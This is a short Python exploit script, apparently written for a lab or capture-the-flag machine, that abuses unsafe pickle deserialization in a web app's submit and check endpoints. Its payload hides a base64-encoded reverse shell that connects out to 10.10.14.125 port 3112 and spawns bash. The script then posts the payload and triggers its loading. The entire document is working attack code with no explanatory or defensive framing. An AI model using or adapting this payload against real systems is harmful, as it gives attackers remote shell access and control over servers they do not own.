#!/usr/bin/env python 
from requests import post 
from hashlib import md5 
import cPickle
import os 
class Exploit(object): 
    def __reduce__(self): 
        return (os.system, ('echo cHl0aG9uIC1jICJpbXBvcnQgb3M7IGltcG9ydCBwdHk7IGltcG9ydCBzb2NrZXQ7IGxob3N0ID0gJzEwLjEwLjE0LjEyNSc7IGxwb3J0ID0gMzExMjsgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSk7IHMuY29ubmVjdCgobGhvc3QsIGxwb3J0KSk7IG9zLmR1cDIocy5maWxlbm8oKSwgMCk7IG9zLmR1cDIocy5maWxlbm8oKSwgMSk7IG9zLmR1cDIocy5maWxlbm8oKSwgMik7IG9zLnB1dGVudignSElTVEZJTEUnLCAnL2Rldi9udWxsJyk7IHB0eS5zcGF3bignL2Jpbi9iYXNoJyk7IHMuY2xvc2UoKTsi|base64 -d|bash',)) 

def createPayload(): 
    return cPickle.dumps(Exploit()) 
URL = "http://localhost/submit" 
EXPLOIT = "http://localhost/check" 
char = createPayload() + "homer" 
quote = "Teck" 
p_id = md5(char + quote).hexdigest() 
print("id: {0}".format(p_id)) 
print("Submitting ...") 
data = {"character":char,"quote":quote} 
submit = post(URL, data=data) 
if submit.status_code == 200: 
    print("Submit ok.") 
else: 
    print("Submit error.") 
data={"id", p_id} 
print("Sending final request ...") 
p = post(EXPLOIT, data={"id":p_id}) 
print(p.status_code)
    
